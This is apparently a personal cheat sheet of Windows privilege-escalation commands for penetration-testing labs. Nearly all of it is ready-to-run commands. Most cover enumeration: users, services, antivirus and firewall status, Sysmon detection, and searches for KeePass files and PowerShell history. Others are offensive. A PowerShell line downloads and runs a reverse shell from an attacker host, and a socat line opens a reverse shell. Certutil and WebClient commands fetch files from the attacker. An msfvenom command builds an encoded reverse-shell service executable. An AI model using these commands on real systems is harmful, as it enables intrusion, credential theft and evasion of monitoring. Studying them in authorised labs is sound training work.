https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
###### Methodology
https://github.com/C0nd4/OSCP-Priv-Esc
```
./winpeas.exe | out-file "winpeas.txt" -Encoding ASCII    // Execute Winpeas, log to a linux-readable (and greppable) file
./winpeas.exe && iconv -f utf-16le -t utf-8 winpeas.txt -o winpeas-utf-8.txt // Linux command to make it "less"-readable
. ./powerup.ps1
Invoke-PrivescAudit > powerlog.txt  // Executes PowerUp.ps1, make sure to be in the same directory
```

### Step one - general information
User / group information
```
Get-LocalUser                               // Get a list of system users
Get-LocalGroup                              // Get a list of system groups
Get-LocalGroupMember SUSPICIOUS_GROUP       // Get a list of users on a system group
```

Network information
```
netstat -ano      // Get a list of open ports on the system
ipconfig /all     // Look for whether the DHCP is enabled, the default gateway and any custom DNS
route print       // View the routing table, it might have routes to other networks. 
```

Installed applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname         // List system applications (1/2)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname                     // List system applications (2/2)
```

Process information
```
Get-Process                            // Prints the processes running on the system
Get-Process -Name SUSPICIOUS -Module   // Print extra information (.exe location, DLLs used)
```

File searching
```
Get-ChildItem -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                                           // Scans for KeePass files
Get-ChildItem -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue                                      // Scans for .txt and .ini files, recommended in XAMPP, .ini files contain configs (my.ini for mySQL)
Get-ChildItem -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue            // Standard scan for user accounts

```

Powershell history
```
type (Get-PSReadlineOption).HistorySavePath                                                                 // Print the powershell history file
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt      // Alternative way to print the history
Note: There might be more commands that have been logged, check the Event Viewer --> event ID 4104 (blocked events)
```

Automated enumaration
```
./winpeas.exe
./seatbelt.exe -group=all
```


#### Services
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """                      // Get unquoted services, only works in CMD
```

##### System information
```
systeminfo | findstr Domain   // Active directory check

Get-ADUser  -Filter *   // Get info about AD // NOTE: If it doesn't work, make sure to import the AD module: "Import-Module ActiveDirectory"

Get-MpComputerStatus | select RealTimeProtectionEnabled   // Check if AV is running

Get-MpComputerStatus   // Get all AV information

Get-NetFirewallProfile | Format-Table Name, Enabled   // Get firewall profile

Get-NetFirewallRule | select DisplayName, Enabled, Description   // Get firewall rules (tons of output)

Get-MpThreat   // View previously blocked threats

Get-EventLog -List   // List logging events (useful for finding servers)

wmic product get name,version   // List all installed applications with version (use searchsploit)

net start   // List currently running processes

Get-Service | findstr /i "Running"   // List currently running processes

wmic service where "name like 'FULL_NAME_WITHOUT_EXE'" get Name,PathName   // Show path of the process (path name, without EXE)

Get-Process -Name FULL_NAME   // List ports and such of process NAME 

netstat -noa | findstr "LISTENING" | findstr "ID"   // Find port by ID of Get-Process


```


##### Reverse shell
```
powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT
```
##### Useful commands

```
net share // Check shares (C:\ etc)

Runas // Run program as other user (Windows sudo)

certutil.exe -urlcache -split -f "http://IP/file" FILENAME  // download file CMD

Invoke-WebRequest -uri <LOCAL-IP>/<FILE> -outfile C:\\Windows\temp\FILE   // Download file from attacker

powershell "(New-Object System.Net.WebClient).Downloadfile('http://IP:8000/FILE','OUTPUT')" // Alternative download

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes // Socat reverse shell

findstr /i "string" // Windows grep (case insensitive)

dir /A  // Windows ls -la

netstat -noa | findstr "LISTENING"  // Displays all TCP port

msfvenom -p windows/shell_reverse_tcp LHOST=10.8.1.167 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe   // Useful EXE reverse shell

(Get-WmiObject Win32_OperatingSystem).OSArchitecture   // Get OS architecture
```

##### Check for system monitoring
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational   // Check if sysmon is installed

findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*   // Look for sysmon config file
```

##### Enumerate DNS

```
nslookup.exe   // CLI for enumerating DNS
server IP   // Set server (can be 127.0.0.1)

ls -d thmredteam.com   // Enumerate DNS of thmredteam.com, check AD for domains

```

Check https://jlajara.gitlab.io/Potatoes_Windows_Privesc
